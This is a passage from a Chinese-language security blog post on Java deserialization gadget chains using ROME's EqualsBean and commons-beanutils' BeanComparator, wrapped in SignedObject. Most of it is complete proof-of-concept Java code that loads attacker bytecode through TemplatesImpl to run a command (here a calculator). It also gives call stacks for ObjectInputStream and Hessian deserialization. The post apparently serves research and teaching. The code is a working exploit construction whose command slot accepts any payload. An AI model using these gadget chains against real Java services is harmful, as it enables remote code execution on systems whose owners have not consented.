</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">com.sun.syndication.feed.impl.EqualsBean</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">javax.xml.transform.Templates</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.security.*</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.util.HashMap</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.util.Hashtable</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import static</span> <span class="nn">util.Tool.*</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">R_SignedObject</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span><span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">TemplatesImpl</span> <span class="n">obj</span> <span class="o">=</span> <span class="k">new</span> <span class="n">TemplatesImpl</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">        <span class="n">setFieldValue</span><span class="o">(</span><span class="n">obj</span><span class="o">,</span> <span class="s">&#34;_bytecodes&#34;</span><span class="o">,</span> <span class="k">new</span> <span class="kt">byte</span><span class="o">[][]{</span>
</span></span><span class="line"><span class="cl">                <span class="n">payload</span><span class="o">(</span><span class="s">&#34;mate-calc&#34;</span><span class="o">).</span><span class="na">toBytecode</span><span class="o">()});</span>
</span></span><span class="line"><span class="cl">        <span class="n">setFieldValue</span><span class="o">(</span><span class="n">obj</span><span class="o">,</span> <span class="s">&#34;_name&#34;</span><span class="o">,</span> <span class="s">&#34;Poria&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">setFieldValue</span><span class="o">(</span><span class="n">obj</span><span class="o">,</span> <span class="s">&#34;_tfactory&#34;</span><span class="o">,</span> <span class="k">new</span> <span class="n">TransformerFactoryImpl</span><span class="o">());</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">Hashtable</span> <span class="n">table1</span> <span class="o">=</span> <span class="n">getPayload</span><span class="o">(</span><span class="n">Templates</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">obj</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">KeyPairGenerator</span> <span class="n">kpg</span> <span class="o">=</span> <span class="n">KeyPairGenerator</span><span class="o">.</span><span class="na">getInstance</span><span class="o">(</span><span class="s">&#34;DSA&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">kpg</span><span class="o">.</span><span class="na">initialize</span><span class="o">(</span><span class="mi">1024</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">KeyPair</span> <span class="n">kp</span> <span class="o">=</span> <span class="n">kpg</span><span class="o">.</span><span class="na">generateKeyPair</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">        <span class="n">SignedObject</span> <span class="n">signedObject</span> <span class="o">=</span> <span class="k">new</span> <span class="n">SignedObject</span><span class="o">(</span><span class="n">table1</span><span class="o">,</span> <span class="n">kp</span><span class="o">.</span><span class="na">getPrivate</span><span class="o">(),</span> <span class="n">Signature</span><span class="o">.</span><span class="na">getInstance</span><span class="o">(</span><span class="s">&#34;DSA&#34;</span><span class="o">));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">Hashtable</span> <span class="n">table2</span> <span class="o">=</span> <span class="n">getPayload</span><span class="o">(</span><span class="n">SignedObject</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">signedObject</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">run</span><span class="o">(</span><span class="n">table2</span><span class="o">,</span> <span class="s">&#34;debug&#34;</span><span class="o">,</span> <span class="s">&#34;object&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">static</span> <span class="n">Hashtable</span> <span class="nf">getPayload</span> <span class="o">(</span><span class="n">Class</span> <span class="n">clazz</span><span class="o">,</span> <span class="n">Object</span> <span class="n">payloadObj</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span><span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">EqualsBean</span> <span class="n">bean</span> <span class="o">=</span> <span class="k">new</span> <span class="n">EqualsBean</span><span class="o">(</span><span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="s">&#34;r&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">HashMap</span> <span class="n">map1</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">        <span class="n">HashMap</span> <span class="n">map2</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">        <span class="n">map1</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">&#34;yy&#34;</span><span class="o">,</span> <span class="n">bean</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">map1</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">&#34;zZ&#34;</span><span class="o">,</span> <span class="n">payloadObj</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">map2</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">&#34;zZ&#34;</span><span class="o">,</span> <span class="n">bean</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">map2</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">&#34;yy&#34;</span><span class="o">,</span> <span class="n">payloadObj</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">Hashtable</span> <span class="n">table</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Hashtable</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">        <span class="n">table</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">map1</span><span class="o">,</span> <span class="s">&#34;1&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">table</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">map2</span><span class="o">,</span> <span class="s">&#34;2&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">setFieldValue</span><span class="o">(</span><span class="n">bean</span><span class="o">,</span> <span class="s">&#34;_beanClass&#34;</span><span class="o">,</span> <span class="n">clazz</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">setFieldValue</span><span class="o">(</span><span class="n">bean</span><span class="o">,</span> <span class="s">&#34;_obj&#34;</span><span class="o">,</span> <span class="n">payloadObj</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">table</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>值得一提的是，因为 rome 的特殊性，该利用既可以用于<code>ObjectInputStream</code>的反序列化，也可以用于<code>HessianInput</code>的反序列化，茯苓分别给出这两种情况下的调用栈</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="nl">readObject:</span><span class="mi">431</span><span class="o">,</span> <span class="n">ObjectInputStream</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="nl">getObject:</span><span class="mi">179</span><span class="o">,</span> <span class="n">SignedObject</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">security</span><span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="nl">invoke0:</span><span class="o">-</span><span class="mi">1</span><span class="o">,</span> <span class="n">NativeMethodAccessorImpl</span> <span class="o">(</span><span class="n">sun</span><span class="o">.</span><span class="na">reflect</span><span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="nl">invoke:</span><span class="mi">62</span><span class="o">,</span> <span class="n">NativeMethodAccessorImpl</span> <span class="o">(</span><span class="n">sun</span><span class="o">.</span><span class="na">reflect</span><span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="nl">invoke:</span><span class="mi">43</span><span class="o">,</span> <span class="n">DelegatingMethodAccessorImpl</span> <span class="o">(</span><span class="n">sun</span><span class="o">.</span><span class="na">reflect</span><span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="nl">invoke:</span><span class="mi">498</span><span class="o">,</span> <span class="n">Method</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">reflect</span><span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="nl">beanEquals:</span><span class="mi">146</span><span class="o">,</span> <span class="n">EqualsBean</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">sun</span><span class="o">.</span><span class="na">syndication</span><span class="o">.</span><span class="na">feed</span><span class="o">.</span><span class="na">impl</span><span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="nl">equals:</span><span class="mi">103</span><span class="o">,</span> <span class="n">EqualsBean</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">sun</span><span class="o">.</span><span class="na">syndication</span><span class="o">.</span><span class="na">feed</span><span class="o">.</span><span class="na">impl</span><span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="nl">equals:</span><span class="mi">495</span><span class="o">,</span> <span class="n">AbstractMap</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="nl">reconstitutionPut:</span><span class="mi">1241</span><span class="o">,</span> <span class="n">Hashtable</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="nl">readObject:</span><span class="mi">1215</span><span class="o">,</span> <span class="n">Hashtable</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="nl">invoke0:</span><span class="o">-</span><span class="mi">1</span><span class="o">,</span> <span class="n">NativeMethodAccessorImpl</span> <span class="o">(</span><span class="n">sun</span><span class="o">.</span><span class="na">reflect</span><span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="nl">invoke:</span><span class="mi">62</span><span class="o">,</span> <span class="n">NativeMethodAccessorImpl</span> <span class="o">(</span><span class="n">sun</span><span class="o">.</span><span class="na">reflect</span><span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="nl">invoke:</span><span class="mi">43</span><span class="o">,</span> <span class="n">DelegatingMethodAccessorImpl</span> <span class="o">(</span><span class="n">sun</span><span class="o">.</span><span class="na">reflect</span><span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="nl">invoke:</span><span class="mi">498</span><span class="o">,</span> <span class="n">Method</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">reflect</span><span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="nl">invokeReadObject:</span><span class="mi">1170</span><span class="o">,</span> <span class="n">ObjectStreamClass</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="nl">readSerialData:</span><span class="mi">2178</span><span class="o">,</span> <span class="n">ObjectInputStream</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="nl">readOrdinaryObject:</span><span class="mi">2069</span><span class="o">,</span> <span class="n">ObjectInputStream</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="nl">readObject0:</span><span class="mi">1573</span><span class="o">,</span> <span class="n">ObjectInputStream</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="nl">readObject:</span><span class="mi">431</span><span class="o">,</span> <span class="n">ObjectInputStream</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="nl">readObject:</span><span class="mi">431</span><span class="o">,</span> <span class="n">ObjectInputStream</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="nl">getObject:</span><span class="mi">179</span><span class="o">,</span> <span class="n">SignedObject</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">security</span><span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="nl">invoke0:</span><span class="o">-</span><span class="mi">1</span><span class="o">,</span> <span class="n">NativeMethodAccessorImpl</span> <span class="o">(</span><span class="n">sun</span><span class="o">.</span><span class="na">reflect</span><span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="nl">invoke:</span><span class="mi">62</span><span class="o">,</span> <span class="n">NativeMethodAccessorImpl</span> <span class="o">(</span><span class="n">sun</span><span class="o">.</span><span class="na">reflect</span><span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="nl">invoke:</span><span class="mi">43</span><span class="o">,</span> <span class="n">DelegatingMethodAccessorImpl</span> <span class="o">(</span><span class="n">sun</span><span class="o">.</span><span class="na">reflect</span><span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="nl">invoke:</span><span class="mi">498</span><span class="o">,</span> <span class="n">Method</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">reflect</span><span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="nl">beanEquals:</span><span class="mi">146</span><span class="o">,</span> <span class="n">EqualsBean</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">sun</span><span class="o">.</span><span class="na">syndication</span><span class="o">.</span><span class="na">feed</span><span class="o">.</span><span class="na">impl</span><span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="nl">equals:</span><span class="mi">103</span><span class="o">,</span> <span class="n">EqualsBean</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">sun</span><span class="o">.</span><span class="na">syndication</span><span class="o">.</span><span class="na">feed</span><span class="o">.</span><span class="na">impl</span><span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="nl">equals:</span><span class="mi">495</span><span class="o">,</span> <span class="n">AbstractMap</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="nl">put:</span><span class="mi">470</span><span class="o">,</span> <span class="n">Hashtable</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="nl">readMap:</span><span class="mi">114</span><span class="o">,</span> <span class="n">MapDeserializer</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">caucho</span><span class="o">.</span><span class="na">hessian</span><span class="o">.</span><span class="na">io</span><span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="nl">readMap:</span><span class="mi">532</span><span class="o">,</span> <span class="n">SerializerFactory</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">caucho</span><span class="o">.</span><span class="na">hessian</span><span class="o">.</span><span class="na">io</span><span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="nl">readObject:</span><span class="mi">1160</span><span class="o">,</span> <span class="n">HessianInput</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">caucho</span><span class="o">.</span><span class="na">hessian</span><span class="o">.</span><span class="na">io</span><span class="o">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="commons-beanutils">commons-beanutils</h4>
<p>茯苓苦思冥想啊，突然想到，能调用 getter 方法的可不止上面提到的，对，就是那个，喊出来吧</p>
<h5 id="beancomparator">BeanComparator</h5>
<p><img
    class="lazyload"
    src="/svg/loading.min.svg"
    data-src="./Zets/index/image-20220810101743856.png"
    data-srcset="./Zets/index/image-20220810101743856.png, ./Zets/index/image-20220810101743856.png 1.5x, ./Zets/index/image-20220810101743856.png 2x"
    data-sizes="auto"
    alt="image-20220810101743856"
    title="image-20220810101743856"/></p>
<p>这条链相信大家都耳熟能详，结合p神构造 CBShiro 的方式让该链只依赖于 commons-beanutils</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">org.apache.commons.beanutils.BeanComparator</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.security.KeyPair</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.security.KeyPairGenerator</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.security.Signature</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.security.SignedObject</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.util.PriorityQueue</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import static</span> <span class="nn">util.Tool.*</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">CB_SingedfObject</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">TemplatesImpl</span> <span class="n">obj</span> <span class="o">=</span> <span class="k">new</span> <span class="n">TemplatesImpl</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">        <span class="n">setFieldValue</span><span class="o">(</span><span class="n">obj</span><span class="o">,</span> <span class="s">&#34;_bytecodes&#34;</span><span class="o">,</span> <span class="k">new</span> <span class="kt">byte</span><span class="o">[][]{</span>
</span></span><span class="line"><span class="cl">                <span class="n">payload</span><span class="o">(</span><span class="s">&#34;mate-calc&#34;</span><span class="o">).</span><span class="na">toBytecode</span><span class="o">()});</span>
</span></span><span class="line"><span class="cl">        <span class="n">setFieldValue</span><span class="o">(</span><span class="n">obj</span><span class="o">,</span> <span class="s">&#34;_name&#34;</span><span class="o">,</span> <span class="s">&#34;Poria&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">setFieldValue</span><span class="o">(</span><span class="n">obj</span><span class="o">,</span> <span class="s">&#34;_tfactory&#34;</span><span class="o">,</span> <span class="k">new</span> <span class="n">TransformerFactoryImpl</span><span class="o">());</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">PriorityQueue</span> <span class="n">queue1</span> <span class="o">=</span> <span class="n">getpayload</span><span class="o">(</span><span class="n">obj</span><span class="o">,</span> <span class="s">&#34;outputProperties&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">KeyPairGenerator</span> <span class="n">kpg</span> <span class="o">=</span> <span class="n">KeyPairGenerator</span><span class="o">.</span><span class="na">getInstance</span><span class="o">(</span><span class="s">&#34;DSA&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">kpg</span><span class="o">.</span><span class="na">initialize</span><span class="o">(</span><span class="mi">1024</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">KeyPair</span> <span class="n">kp</span> <span class="o">=</span> <span class="n">kpg</span><span class="o">.</span><span class="na">generateKeyPair</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">        <span class="n">SignedObject</span> <span class="n">signedObject</span> <span class="o">=</span> <span class="k">new</span> <span class="n">SignedObject</span><span class="o">(</span><span class="n">queue1</span><span class="o">,</span> <span class="n">kp</span><span class="o">.</span><span class="na">getPrivate</span><span class="o">(),</span> <span class="n">Signature</span><span class="o">.</span><span class="na">getInstance</span><span class="o">(</span><span class="s">&#34;DSA&#34;</span><span class="o">));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">PriorityQueue</span> <span class="n">queue2</span> <span class="o">=</span> <span class="n">getpayload</span><span class="o">(</span><span class="n">signedObject</span><span class="o">,</span> <span class="s">&#34;object&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">run</span><span class="o">(</span><span class="n">queue2</span><span class="o">,</span> <span class="s">&#34;debug&#34;</span><span class="o">,</span> <span class="s">&#34;object&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">static</span> <span class="n">PriorityQueue</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">&gt;</span> <span class="nf">getpayload</span><span class="o">(</span><span class="n">Object</span> <span class="n">object</span><span class="o">,</span> <span class="n">String</span> <span class="n">string</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">BeanComparator</span> <span class="n">beanComparator</span> <span class="o">=</span> <span class="k">new</span> <span class="n">BeanComparator</span><span class="o">(</span><span class="kc">null</span><span class="o">,</span> <span class="n">String</span><span class="o">.</span><span class="na">CASE_INSENSITIVE_ORDER</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">PriorityQueue</span> <span class="n">priorityQueue</span> <span class="o">=</span> <span class="k">new</span> <span class="n">PriorityQueue</span><span class="o">(</span><span class="mi">2</span><span class="o">,</span> <span class="n">beanComparator</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">priorityQueue</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="s">&#34;1&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">priorityQueue</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="s">&#34;2&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">setFieldValue</span><span class="o">(</span><span class="n">beanComparator</span><span class="o">,</span> <span class="s">&#34;property&#34;</span><span class="o">,</span> <span class="n">string</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">setFieldValue</span><span class="o">(</span><span class="n">priorityQueue</span><span class="o">,</span> <span class="s">&#34;queue&#34;</span><span class="o">,</span> <span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="n">object</span><span class="o">,</span> <span class="kc">null</span><span class="o">});</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">priorityQueue</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>构造过程和上面相似，不在赘述，茯苓在这里直接给出调用栈</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="nl">readObject:</span><span class="mi">431</span><span class="o">,</span> <span class="n">ObjectInputStream</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="nl">getObject:</span><span class="mi">179</span><span class="o">,</span> <span class="n">SignedObject</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">security</span><span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="nl">invoke0:</span><span class="o">-</span><span class="mi">1</span><span class="o">,</span> <span class="n">NativeMethodAccessorImpl</span> <span class="o">(</span><span class="n">sun</span><span class="o">.</span><span class="na">reflect</span><span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="nl">invoke:</span><span class="mi">62</span><span class="o">,</span> <span class="n">NativeMethodAccessorImpl</span> <span class="o">(</span><span class="n">sun</span><span class="o">.</span><span class="na">reflect</span><span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="nl">invoke:</span><span class="mi">43</span><span class="o">,</span> <span class="n">DelegatingMethodAccessorImpl</span> <span class="o">(</span><span class="n">sun</span><span class="o">.</span><span class="na">reflect</span><span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="nl">invoke:</span><span class="mi">498</span><span class="o">,</span> <span class="n">Method</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">reflect</span><span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="nl">invokeMethod:</span><span class="mi">2116</span><span class="o">,</span> <span class="n">PropertyUtilsBean</span> <span class="o">(</span><span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">commons</span><span class="o">.</span><span class="na">beanutils</span><span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="nl">getSimpleProperty:</span><span class="mi">1267</span><span class="o">,</span> <span class="n">PropertyUtilsBean</span> <span class="o">(</span><span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">commons</span><span class="o">.</span><span class="na">beanutils</span><span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="nl">getNestedProperty:</span><span class="mi">808</span><span class="o">,</span> <span class="n">PropertyUtilsBean</span> <span class="o">(</span><span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">commons</span><span class="o">.</span><span class="na">beanutils</span><span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="nl">getProperty:</span><span class="mi">884</span><span class="o">,</span> <span class="n">PropertyUtilsBean</span> <span class="o">(</span><span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">commons</span><span class="o">.</span><span class="na">beanutils</span><span class="o">)</span>
